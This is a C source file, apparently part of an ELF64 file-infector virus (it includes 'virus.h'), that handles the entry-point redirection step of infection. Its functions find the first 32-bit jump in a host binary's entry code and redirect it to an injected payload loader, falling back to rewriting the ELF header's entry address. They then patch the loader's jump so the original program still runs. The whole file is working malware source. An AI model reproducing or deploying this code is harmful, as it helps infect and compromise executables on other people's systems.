#include "virus.h"
#include "jumps.h"
#include "disasm.h"
#include "disasm_utils.h"
#include "compiler_utils.h"
#include "errors.h"
#include "logs.h"

static bool	change_header_entry(struct safe_ptr clone_ref,
			const struct entry *entry,
			size_t dist_clientjmp_loader)
{
	Elf64_Ehdr	*elf_hdr = safe(clone_ref, 0, sizeof(Elf64_Ehdr));

	if (!elf_hdr) return errors(ERR_FILE, _ERR_F_READ_EHDR, _ERR_T_CHANGE_HEADER_ENTRY);

	const size_t	payload_offset = entry->payload_offset;
	const size_t	payload_addr   = entry->payload_addr;
	const size_t	entry_addr     = entry->entry_addr;

	const size_t	loader_jump_offset = payload_offset + dist_clientjmp_loader;

	const void	*loader_entry = safe(clone_ref, payload_offset, 0);
	const void	*loader_jump  = safe(clone_ref, loader_jump_offset, JMP32_INST_SIZE);

	if (loader_entry == NULL || loader_jump == NULL)
		return errors(ERR_FILE, _ERR_F_READ_LOADER, _ERR_T_CHANGE_HEADER_ENTRY);

	const size_t	loader_jump_addr  = payload_addr + (loader_jump - loader_entry);
	const int32_t	loader_jump_value = entry_addr - (loader_jump_addr + JMP32_INST_SIZE);

	if (!write_jmp32(clone_ref, loader_jump_offset, loader_jump_value))
		return errors(ERR_THROW, _ERR_NO, _ERR_T_CHANGE_HEADER_ENTRY);

	elf_hdr->e_entry = payload_addr;
	log_change_header_entry();
	return true;
}

static bool	change_client_jump(struct safe_ptr clone_ref,
			const struct entry *entry,
			size_t dist_clientjmp_loader)
{
	const size_t	entry_offset   = entry->entry_offset;
	const size_t	payload_offset = entry->payload_offset;
	const size_t	entry_addr     = entry->entry_addr;
	const size_t	payload_addr   = entry->payload_addr;

	// get client entry and jump pointers
	const void	*client_entry = safe(clone_ref, entry_offset, 0);
	const void	*client_jump  = find_first_jmp32(clone_ref, entry_offset);

	if (client_entry == NULL)
		return errors(ERR_THROW, _ERR_NO, _ERR_T_CHANGE_CLIENT_JUMP);

	// drop this way if client can't be parsed
	if (client_jump == NULL)
		return false;

	// get loader entry and jump pointers
	const size_t	loader_jump_offset = payload_offset + dist_clientjmp_loader;
	const void	*loader_entry = safe(clone_ref, payload_offset, 0);
	const void	*loader_jump  = safe(clone_ref, loader_jump_offset, JMP32_INST_SIZE);

	if (loader_jump == NULL || loader_entry == NULL)
		return errors(ERR_FILE, _ERR_F_READ_LOADER, _ERR_T_CHANGE_CLIENT_JUMP);

	// get client jump destination
	const size_t	client_jump_offset = client_jump - clone_ref.ptr;
	const void	*client_jump_dst   = get_jmp32_destination(clone_ref, client_jump_offset);

	if (client_jump_dst == NULL)
		return errors(ERR_THROW, _ERR_NO, _ERR_T_CHANGE_CLIENT_JUMP);

	// compute new values for client and loader jumps
	const size_t	loader_jump_addr     = payload_addr + (loader_jump - loader_entry);
	const size_t	client_jump_addr     = entry_addr + (client_jump - client_entry);
	const size_t	client_jump_dst_addr = entry_addr + (client_jump_dst - client_entry);

	const int32_t	loader_jump_value = (int32_t)(client_jump_dst_addr - (loader_jump_addr + JMP32_INST_SIZE));
	const int32_t	client_jump_value = (int32_t)(payload_addr - (client_jump_addr + JMP32_INST_SIZE));

	// write values
	if (!write_jmp32(clone_ref, loader_jump_offset, loader_jump_value)
	|| !write_jmp32(clone_ref, client_jump_offset, client_jump_value))
		return errors(ERR_THROW, _ERR_NO, _ERR_T_CHANGE_CLIENT_JUMP);

	log_change_client_jump();
	return true;
}

bool	change_entry(struct safe_ptr clone_ref, const struct entry *entry,
		size_t dist_clientjmp_loader)
{
	if (!change_client_jump(clone_ref, entry, dist_clientjmp_loader)
	&& !change_header_entry(clone_ref, entry, dist_clientjmp_loader))
		return errors(ERR_THROW, _ERR_NO, _ERR_T_CHANGE_ENTRY);

	return true;
}
